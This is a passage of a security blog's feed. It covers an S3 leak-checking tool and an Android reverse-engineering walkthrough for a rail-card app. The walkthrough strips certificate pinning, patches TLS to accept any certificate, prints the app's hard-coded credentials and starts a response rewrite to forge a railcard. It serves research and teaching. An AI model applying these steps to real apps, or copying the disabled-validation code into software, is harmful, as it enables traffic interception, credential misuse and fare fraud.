			"content_html": "<p>Think you set your S3 bucket policies correctly? Nothing accidentally public? Trust but verify.</p>\n<p>I developed a tool to test your organisation's S3 setup: <a href=\"https://github.com/heyhabito/s3-bucket-inspector\"><img alt=\":octocat:\" src=\"https://github.githubassets.com/images/icons/emoji/octocat.png?v8\" style=\"max-width: 1em; max-height: 1em; display: inline-block;\">heyhabito/s3-bucket-inspector</a>.</p>\n<h2 id=\"why\" tabindex=\"-1\">Why <a class=\"header-anchor\" href=\"https://blog.caller.xyz/your-s3-buckets-are-leaking/\">#</a></h2>\n<p>S3 configuration can be complicated. You can have conflicting bucket ACL, bucket policy, object ACLs, public access blocks. Tools for inspecting S3 policies don't always understand the nuances of IP whitelisting and can blurt out false positives or give false negatives. On top of that, your perfectly configured bucket could have been reconfigured by a colleague.</p>\n<p>The best way to check for leaky buckets is to actually attempt access:</p>\n<ul>\n<li>From outside your VPC</li>\n<li>From a non-whitelisted IP</li>\n<li>Without an access key</li>\n</ul>\n<p>for the operations List, Get, Put and Delete.</p>\n<p>Check on a schedule for <strong>Continuous Security™</strong>, and receive warnings on Slack.</p>\n<h2 id=\"what\" tabindex=\"-1\">What <a class=\"header-anchor\" href=\"https://blog.caller.xyz/your-s3-buckets-are-leaking/\">#</a></h2>\n<p>Since the lambdas are run outside your VPC, they will be testing what access is allowed to the public Internet.</p>\n<p>The following issues are reported:</p>\n<ul>\n<li>All keys in your bucket can be listed at <code>http://{bucket_name}.s3.amazonaws.com</code></li>\n<li>Anyone can upload (PUT) objects into your bucket</li>\n<li>Anyone can delete objects from your bucket</li>\n<li>An object is publicly readable (Not comprehensive since that would require testing every single key)</li>\n</ul>\n<p>It is very unlikely you want the keys of your bucket publicly listable. You definitely don't want people uploading illegal content to your buckets. Still, you can silence warnings you don't care about in <code>whitelist.json</code>.</p>\n<h2 id=\"an-example-s3-gotcha\" tabindex=\"-1\">An Example S3 Gotcha <a class=\"header-anchor\" href=\"https://blog.caller.xyz/your-s3-buckets-are-leaking/\">#</a></h2>\n<p>Let's say you use the bucket policy example from the <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/dev/example-bucket-policies.html#example-bucket-policies-use-case-3\">AWS documentation on restricting access by IP</a>:</p>\n<pre class=\"language-json\" tabindex=\"0\"><code class=\"language-json\"><span class=\"token punctuation\">{</span>\n  <span class=\"token property\">\"Version\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2012-10-17\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"Id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"S3PolicyId1\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"Statement\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token property\">\"Sid\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"IPAllow\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token property\">\"Effect\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Allow\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token property\">\"Principal\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"*\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token property\">\"Action\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"s3:*\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token property\">\"Resource\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"arn:aws:s3:::examplebucket/*\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token property\">\"Condition\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n         <span class=\"token property\">\"IpAddress\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><span class=\"token property\">\"aws:SourceIp\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"54.240.143.0/24\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n         <span class=\"token property\">\"NotIpAddress\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span><span class=\"token property\">\"aws:SourceIp\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"54.240.143.188/32\"</span><span class=\"token punctuation\">}</span> \n      <span class=\"token punctuation\">}</span> \n    <span class=\"token punctuation\">}</span> \n  <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span></code></pre>\n<p>Here the whitelisted IP addresses are allowed to upload objects via unauthenticated PUT requests.\nHowever, who is the owner of those new objects?</p>\n<p>The owner is <code>65a011a29cdf8ec533ec3d1ccaae921c</code> AKA <em>Anonymous</em>.</p>\n<p>Looking at the policy, you'd think that only the whitelisted IP addresses would be able to access anything.\nHowever, the objects are owned by Anonymous, not the bucket owner.</p>\n<p>This means that the policy is ignored and <strong>anybody on the Internet</strong> (Anonymous) can GET the object regardless of IP if they can guess the key.</p>\n",
			"date_published": "2019-05-03T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/what-the-fuzz/",
			"url": "https://blog.caller.xyz/what-the-fuzz/",
			"title": "What The Fuzz",
			"content_html": "<p>I wrote a blog post about my experiences fuzz-testing external and internal APIs, and covered some python and Postgres oddities.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/HJEf1BWn9M-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/HJEf1BWn9M-1200.webp 1200w\"><img alt=\"Hot Fuzz\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/HJEf1BWn9M-1200.jpeg\" width=\"1200\" height=\"720\"></picture><figcaption>Hot Fuzz</figcaption></figure><p></p>\n<p><a href=\"https://smarketshq.com/what-the-fuzz-67c8ed47368a\">Read the full blog post at Smarkets HQ</a></p>\n",
			"date_published": "2019-01-17T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/man-in-the-middling-android-apps/",
			"url": "https://blog.caller.xyz/man-in-the-middling-android-apps/",
			"title": "Man-in-the-middling Android apps",
			"content_html": "<p>This is a walk-through of how I go about investigating Android apps.\nI'm not a subject matter expert, so take everything here with a pinch of salt.\nAs a case-study, I'll look at the <a href=\"https://play.google.com/store/apps/details?id=com.raildeliverygroup.railcard\">Railcards</a> app which aims to replace physical railcards with ones which can run out of battery.</p>\n<p>I have no relationship with the Rail Delivery Group, and I won't be conducting an unsolicited penetration test. Nor should you. I will however man-in-the-middle the app so I can see all the communication between the app and its server. Combined with reverse-engineering, I can then understand how the app and service work.</p>\n<h2 id=\"development-environment\" tabindex=\"-1\">Development Environment <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h2>\n<p>In this section we'll set up a proxy server which will allow you to inspect app communication to and from your Android device (physical or emulator).</p>\n<h3 id=\"start-your-proxy\" tabindex=\"-1\">Start your proxy <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h3>\n<p>Install ZAP (or mitmproxy or equivalent). In Options &gt; Local Proxies, choose the correct address. This is probably <code>localhost</code> to proxy emulator traffic, or your network adapter IP to proxy traffic from your phone.</p>\n<h3 id=\"emu\" tabindex=\"-1\">Emu <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h3>\n<p>It's helpful to have an Android emulator to play with. You don't need to be scared about breaking anything with an emulator and you can choose whichever Android version you want. As a starting point, I recommend the <a href=\"https://www.genymotion.com/fun-zone/\">Genymotion Personal Edition</a>.</p>\n<p>You want to be able to connect to your device with <code>adb</code> which allows you to e.g. get a shell <code>adb shell</code>. For a physical device, install the <a href=\"https://developer.android.com/studio/releases/platform-tools\">Android SDK Platform Tools</a>. Genymotion emulator has it's own version of adb.</p>\n<h3 id=\"route-wi-fi-traffic-through-proxy\" tabindex=\"-1\">Route Wi-Fi traffic through proxy <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h3>\n<p>You need to modify the advanced options of your device's Wi-Fi connection. Set the proxy to Manual and enter the hostname and port.\nFor the Genymotion emulator, put the special IP <code>10.0.3.2</code> for the hostname. Otherwise you probably want the IP of your ZAP proxy.\nI often put <code>*.google.com,*.googleapis.com,*.gstatic.com</code> in the bypass section if I need Google services and things are broken.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/V5Hs8VOv32-869.avif 869w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/V5Hs8VOv32-869.webp 869w\"><img alt=\"Android proxy setup\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/V5Hs8VOv32-869.png\" width=\"869\" height=\"1354\"></picture><figcaption>Android proxy setup</figcaption></figure><p></p>\n<p>Now, when you open your device's browser and visit <code>http://example.com</code>, you should see the request and response appear in ZAP.\nWhen you visit <code>https://caller.xyz</code> or another HTTPS site, the page should load but with a certificate error.</p>\n<h3 id=\"install-zap-ca-certificate\" tabindex=\"-1\">Install ZAP CA certificate <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h3>\n<p>Clients can access HTTPS servers via the proxy using the CONNECT method. A normal proxy should allow creation of a secure client-server tunnel where the proxy can't read the plaintext communication. ZAP behaves differently: it connects the client and server via  a server-ZAP HTTPS connection and a ZAP-client HTTPS connection. Using two separate connections, ZAP can intercept plaintext communication from the server before forwarding it to the client and vice versa.</p>\n<p>Since ZAP doesn't have a valid certificate to pretend to be the server (in the ZAP-client connection), it dynamically generates a certificate. This would be flagged as insecure as it isn't signed by a trusted CA. To get around this, add your auto-generated ZAP CA certificate to your device's certificate store.</p>\n<ol>\n<li>Export ZAP certificate: Options &gt; Dynamic SSL Certificates &gt; Save</li>\n<li>Copy it over to the device with adb: <code>adb push path/to/zap.cer</code></li>\n<li>In your device's security settings there should be an option like &quot;Install from SD card&quot; which allows the certificate to be installed.</li>\n</ol>\n<p>Now the browser should load HTTPS sites without showing a certificate error.</p>\n<h2 id=\"poking-the-app\" tabindex=\"-1\">Poking the app <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h2>\n<h3 id=\"get-the-apk-on-your-computer\" tabindex=\"-1\">Get the apk on your computer <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h3>\n<p>Search for the apk. There are many sites hosting them. Alternatively, download it to your device from the Play store and pull it via adb.\nI used v1.1.3 with SHA256 b45a5528922eadfed49e38039cff6365aacd8370e98b3d27d5bab2f53690811a.</p>\n<h3 id=\"install-the-apk\" tabindex=\"-1\">Install the apk <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h3>\n<p>Install it with <code>adb install railcards.apk</code>. Run the app. Hmmmm it doesn't work.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/nWsLwJOmZD-767.avif 767w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/nWsLwJOmZD-767.webp 767w\"><img alt=\"Apps says it's offline\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/nWsLwJOmZD-767.png\" width=\"767\" height=\"1183\"></picture><figcaption>Apps says it's offline</figcaption></figure><p></p>\n<p>The internet is working in the browser, but no requests from the Railcards app can be seen in ZAP. Wireshark shows the emulator connecting to ZAP, but the ZAP certificate is being rejected by the app.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/T-UsDHcpKW-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/T-UsDHcpKW-1200.webp 1200w\"><img alt=\"Wireshark shows TLS connection between ZAP and emulator\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/T-UsDHcpKW-1200.png\" width=\"1200\" height=\"785\"></picture><figcaption>Wireshark shows TLS connection between ZAP and emulator</figcaption></figure><p></p>\n<h3 id=\"tear-it-apart\" tabindex=\"-1\">Tear it apart <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h3>\n<p>Let's decode the apk with apktool and see what's going on <code>apktool d --no-res railcards.apk</code>.</p>\n<p>Android code is compiled, obfuscated with proguard, and targeted at Dalvik rather than the standard JVM. This means that the tooling for reverse engineering rarely gives you perfect decompilation into Java.\nA reasonable attempt at browsing the Java decompilation is by running <code>dex2jar railcards.apk</code> and then opening the <code>railcards_dex2jar.jar</code> in <code>jd-gui</code>. I searched around for the code which makes requests, and in <code>com.raildeliverygroup.railcard.app.net.b</code> found:</p>\n<pre class=\"language-java\" tabindex=\"0\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> a\n<span class=\"token punctuation\">{</span>\n  <span class=\"token class-name\">CertificatePinner</span> <span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">CertificatePinner<span class=\"token punctuation\">.</span>Builder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prod.digital-railcard.co.uk\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span> <span class=\"token string\">\"sha256/rfNAS9FMyvxACLmHPLTQIHnFNs+MIde1t7Vcym6qMM4=\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prod.digital-railcard.co.uk\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">{</span> <span class=\"token string\">\"sha256/5kJvNEMw0KjrCAu7eXY5HZdvyCS13BbA0VJG1RSP91w=\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre>\n<p>The first reason we're getting connection errors is due to the use of certificate pinning as described in the <a href=\"https://square.github.io/okhttp/3.x/okhttp/okhttp3/CertificatePinner.html\">OkHttp library docs</a>. The app requires the connection to be made using specific certificates. Since our dynamically-generated ZAP certificate doesn't have <a href=\"https://stackoverflow.com/a/46309453\">those hashes</a> in its chain of trust, validation fails.</p>\n<h3 id=\"get-rid-of-the-certificate-pinning\" tabindex=\"-1\">Get rid of the certificate pinning <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h3>\n<p>Apktool created a smali directory. Smali/baksmali is the assembly language for the Dalvik machine code.\nAs such, browsing the smali code is much more reliable than looking at the Java, and it can be reassembled.\nThe smali file at <code>smali/com/raildeliverygroup/railcard/app/net/b/a.smali</code> (originally from <code>NetworkModule.java</code>) contains:</p>\n<pre class=\"language-smali\" tabindex=\"0\"><code class=\"language-smali\"><span class=\"token keyword\">.method</span> <span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">okhttp3<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">CertificatePinner</span></span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">.locals</span> <span class=\"token number\">6</span>\n    <span class=\"token keyword\">.prologue</span>\n    const/4 <span class=\"token register variable\">v5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1</span>\n    const/4 <span class=\"token register variable\">v4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0</span>\n    <span class=\"token keyword\">.line</span> <span class=\"token number\">48</span>\n    new-instance <span class=\"token register variable\">v0</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">okhttp3<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">CertificatePinner$Builder</span></span><span class=\"token punctuation\">;</span>\n    invoke-direct <span class=\"token punctuation\">{</span><span class=\"token register variable\">v0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">okhttp3<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">CertificatePinner$Builder</span></span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">&lt;init></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token builtin\">V</span>\n    const-string <span class=\"token register variable\">v1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"prod.digital-railcard.co.uk\"</span>\n    new-array <span class=\"token register variable\">v2</span><span class=\"token punctuation\">,</span> <span class=\"token register variable\">v5</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">[</span><span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">java<span class=\"token punctuation\">/</span>lang<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">String</span></span><span class=\"token punctuation\">;</span>\n    const-string <span class=\"token register variable\">v3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"sha256/rfNAS9FMyvxACLmHPLTQIHnFNs+MIde1t7Vcym6qMM4=\"</span>\n    aput-object <span class=\"token register variable\">v3</span><span class=\"token punctuation\">,</span> <span class=\"token register variable\">v2</span><span class=\"token punctuation\">,</span> <span class=\"token register variable\">v4</span>\n    <span class=\"token keyword\">.line</span> <span class=\"token number\">49</span>\n    invoke-virtual <span class=\"token punctuation\">{</span><span class=\"token register variable\">v0</span><span class=\"token punctuation\">,</span> <span class=\"token register variable\">v1</span><span class=\"token punctuation\">,</span> <span class=\"token register variable\">v2</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">okhttp3<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">CertificatePinner$Builder</span></span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">java<span class=\"token punctuation\">/</span>lang<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">String</span></span><span class=\"token punctuation\">;</span><span class=\"token operator\">[</span><span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">java<span class=\"token punctuation\">/</span>lang<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">String</span></span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">okhttp3<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">CertificatePinner$Builder</span></span><span class=\"token punctuation\">;</span>\n    move-result-object <span class=\"token register variable\">v0</span>\n    const-string <span class=\"token register variable\">v1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"prod.digital-railcard.co.uk\"</span>\n    new-array <span class=\"token register variable\">v2</span><span class=\"token punctuation\">,</span> <span class=\"token register variable\">v5</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">[</span><span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">java<span class=\"token punctuation\">/</span>lang<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">String</span></span><span class=\"token punctuation\">;</span>\n    const-string <span class=\"token register variable\">v3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"sha256/5kJvNEMw0KjrCAu7eXY5HZdvyCS13BbA0VJG1RSP91w=\"</span>\n    aput-object <span class=\"token register variable\">v3</span><span class=\"token punctuation\">,</span> <span class=\"token register variable\">v2</span><span class=\"token punctuation\">,</span> <span class=\"token register variable\">v4</span>\n    <span class=\"token keyword\">.line</span> <span class=\"token number\">50</span>\n    invoke-virtual <span class=\"token punctuation\">{</span><span class=\"token register variable\">v0</span><span class=\"token punctuation\">,</span> <span class=\"token register variable\">v1</span><span class=\"token punctuation\">,</span> <span class=\"token register variable\">v2</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">okhttp3<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">CertificatePinner$Builder</span></span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">java<span class=\"token punctuation\">/</span>lang<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">String</span></span><span class=\"token punctuation\">;</span><span class=\"token operator\">[</span><span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">java<span class=\"token punctuation\">/</span>lang<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">String</span></span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">)</span><span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">okhttp3<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">CertificatePinner$Builder</span></span><span class=\"token punctuation\">;</span>\n    move-result-object <span class=\"token register variable\">v0</span>\n    <span class=\"token keyword\">.line</span> <span class=\"token number\">51</span>\n    invoke-virtual <span class=\"token punctuation\">{</span><span class=\"token register variable\">v0</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">okhttp3<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">CertificatePinner$Builder</span></span><span class=\"token punctuation\">;</span><span class=\"token operator\">-></span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token class-name\"><span class=\"token builtin\">L</span><span class=\"token namespace\">okhttp3<span class=\"token punctuation\">/</span></span><span class=\"token class-name\">CertificatePinner</span></span><span class=\"token punctuation\">;</span>\n    move-result-object <span class=\"token register variable\">v0</span>\n    <span class=\"token keyword\">.line</span> <span class=\"token number\">48</span>\n    return-object <span class=\"token register variable\">v0</span>\n<span class=\"token keyword\">.end</span> <span class=\"token keyword\">method</span></code></pre>\n<p>I kept the method signature the same, but deleted the lines specifying the pins, so the method now returns an empty, impotent <code>CertificatePinner</code>.\nRemoving all 12 command lines after the call to <code>init</code> and before the call to <code>build</code> left code which functions like <code>return new CertificatePinner.Builder().build()</code>.</p>\n<h3 id=\"rebuild-and-sign-the-apk\" tabindex=\"-1\">Rebuild and sign the apk <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h3>\n<p>The altered smali can now be reassembled into machine code to make an apk with altered code. Since we don't have the proper apk signing key:</p>\n<ul>\n<li>we'll need to use our own one (<code>keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000</code>)</li>\n<li>we need to uninstall the original apk before we can install our cooked one</li>\n</ul>\n<pre><code>apktool b -f -d com.raildeliverygroup.railcard_2018-05-30 &amp;&amp; jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore com.raildeliverygroup.railcard_2018-05-30/dist/com.raildeliverygroup.railcard_2018-05-30.apk alias_name &amp;&amp; adb uninstall com.raildeliverygroup.railcard &amp;&amp; adb install com.raildeliverygroup.railcard_2018-05-30/dist/com.raildeliverygroup.railcard_2018-05-30.apk\n</code></pre>\n<p>On my emulator I can now see traffic 🎉, but I can't get it to work on my phone.\nThis is due to a <a href=\"https://android-developers.googleblog.com/2016/07/changes-to-trusted-certificate.html\">change since Nougat</a> (7.0 or API level 24). Apps now don't respect that user CA store we added the ZAP cert to earlier.\nThe apps only use the root CAs, or they can use their own custom request handling.</p>\n<h3 id=\"patch-tls-certificate-validation\" tabindex=\"-1\">Patch TLS certificate validation <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h3>\n<p>Since I don't have the private key of a trusted CA, I instead made the app not care about invalid certificates. It was a bit more involved than the pinning change, so I wrote the Android java code I wanted first. You can play with it at <a href=\"https://github.com/bcaller/unsafe-okhttp3-android/blob/master/app/src/main/java/xyz/caller/insecurity/UnsafeOkHttpClient.java\"><img alt=\":octocat:\" src=\"https://github.githubassets.com/images/icons/emoji/octocat.png?v8\" style=\"max-width: 1em; max-height: 1em; display: inline-block;\">bcaller/unsafe-okhttp3-android</a>. Then I decoded the apk to get the smali code I needed for the railcards project so that the method <code>OkHttpClient.Builder b()</code> returns a builder with a <em>special custom trust model</em> of accepting all certs. If you're interested in learning smali, writing Android Java code and disassembling the apk to smali is the second best way (after reading the smali docs).</p>\n<p><em>Oops: It may have been easier to just add <a href=\"https://developer.android.com/training/articles/security-config\">network security config</a> to AndroidManifest.xml</em></p>\n<h3 id=\"profit\" tabindex=\"-1\">Profit <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h3>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/ZDhlAeds3x-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/ZDhlAeds3x-1200.webp 1200w\"><img alt=\"It works\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/ZDhlAeds3x-1200.png\" width=\"1200\" height=\"1029\"></picture><figcaption>It works</figcaption></figure><p></p>\n<p>Now we have MitM'd the connection, we can see what the app is saying about us and to whom!</p>\n<h2 id=\"more-poking\" tabindex=\"-1\">More poking <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h2>\n<h3 id=\"secret-password\" tabindex=\"-1\">Secret password <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h3>\n<p>If you make a request to <code>https://prod.digital-railcard.co.uk/api/v0.0.2/devices/a/railcards</code> then you get a 401. Browsing the code, I found <code>smali/com/raildeliverygroup/railcard/app/net/c/a.smali</code> (originally <code>AuthorizationInterceptor.java</code>) containing some amusing code.</p>\n<pre class=\"language-java\" tabindex=\"0\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> a <span class=\"token keyword\">implements</span> <span class=\"token class-name\">Interceptor</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">public</span> <span class=\"token class-name\">Response</span> <span class=\"token function\">intercept</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Interceptor<span class=\"token punctuation\">.</span>Chain</span> paramChain<span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> paramChain<span class=\"token punctuation\">.</span><span class=\"token function\">proceed</span><span class=\"token punctuation\">(</span>\n      paramChain<span class=\"token punctuation\">.</span><span class=\"token function\">request</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">newBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">.</span><span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Authorization\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Basic YXBwbGljYXRpb25AZXhhbXBsZS5jb206dGVzdHJhaWxhcGk=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">build</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre>\n<p>Hard-coded basic auth creds: <strong><code>application@example.com:testrailapi</code></strong>. It's not really a security issue since this had to be baked into the client app anyway.</p>\n<h3 id=\"data\" tabindex=\"-1\">Data <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h3>\n<p>To see and modify the app's data, try looking for XML and sqlite3 files in <code>/data/data/com.raildeliverygroup.railcard</code>. Nothing particularly interesting to report for this app.</p>\n<h3 id=\"diy-railcard-forgery-saved-by-the-barcode\" tabindex=\"-1\">DIY-railcard forgery / Saved by the barcode <a class=\"header-anchor\" href=\"https://blog.caller.xyz/man-in-the-middling-android-apps/\">#</a></h3>\n<p>We can also use ZAP to <em>rewrite</em> intercepted responses (start by setting break points) to give our app a shiny new railcard:</p>\n<pre class=\"language-json\" tabindex=\"0\"><code class=\"language-json\"><span class=\"token punctuation\">{</span>\n    <span class=\"token property\">\"data\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token property\">\"cardholders\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token property\">\"cardholder_forename\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"Thomas\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"cardholder_id\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1111111</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token property\">\"cardholder_photo_url\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"https://crossvale.com/wp-content/uploads/2018/10/ttte.jpg\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token 